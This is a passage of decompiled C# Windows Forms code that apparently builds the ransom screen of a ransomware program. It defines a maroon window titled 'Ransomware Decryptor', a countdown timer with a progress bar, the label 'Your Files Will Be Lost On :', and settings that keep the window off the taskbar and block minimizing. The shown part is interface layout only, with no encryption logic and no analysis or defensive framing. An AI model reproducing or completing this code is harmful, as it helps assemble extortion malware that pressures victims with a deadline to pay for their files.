		((Control)Panel1).get_Controls().Add((Control)(object)Label9);
		((Control)Panel1).set_Location(new Point(24, 271));
		((Control)Panel1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(157, 62));
		((Control)Panel1).set_TabIndex(13);
		((Control)ProgressBar1).set_Location(new Point(3, 39));
		((Control)ProgressBar1).set_Margin(new Padding(4, 4, 4, 4));
		ProgressBar1.set_Maximum(71);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(145, 12));
		((Control)ProgressBar1).set_TabIndex(4);
		Label7.set_AutoSize(true);
		((Control)Label7).set_Font(new Font("Tahoma", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.White);
		((Control)Label7).set_Location(new Point(97, 5));
		((Control)Label7).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(49, 33));
		((Control)Label7).set_TabIndex(3);
		Label7.set_Text("00");
		Label8.set_AutoSize(true);
		((Control)Label8).set_Font(new Font("Tahoma", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label8).set_ForeColor(Color.White);
		((Control)Label8).set_Location(new Point(63, 5));
		((Control)Label8).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(25, 33));
		((Control)Label8).set_TabIndex(2);
		Label8.set_Text(":");
		Label9.set_AutoSize(true);
		((Control)Label9).set_Font(new Font("Tahoma", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label9).set_ForeColor(Color.White);
		((Control)Label9).set_Location(new Point(4, 5));
		((Control)Label9).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label9).set_Name("Label9");
		((Control)Label9).set_Size(new Size(49, 33));
		((Control)Label9).set_TabIndex(1);
		Label9.set_Text("00");
		Label10.set_AutoSize(true);
		((Control)Label10).set_ForeColor(Color.White);
		((Control)Label10).set_Location(new Point(12, 238));
		((Control)Label10).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label10).set_Name("Label10");
		((Control)Label10).set_Size(new Size(166, 16));
		((Control)Label10).set_TabIndex(14);
		Label10.set_Text("Your Files Will Be Lost On :");
		Timer1.set_Interval(1000);
		BackgroundWorker1.WorkerReportsProgress = true;
		BackgroundWorker1.WorkerSupportsCancellation = true;
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(963, 597));
		((Control)this).get_Controls().Add((Control)(object)Label10);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel3);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel2);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox2);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4, 4, 4, 4));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Ransomware Decryptor");
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((ISupportInitialize)PictureBox2).EndInit();
		((Control)GroupBox2).ResumeLayout(false);
		((Control)GroupBox2).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
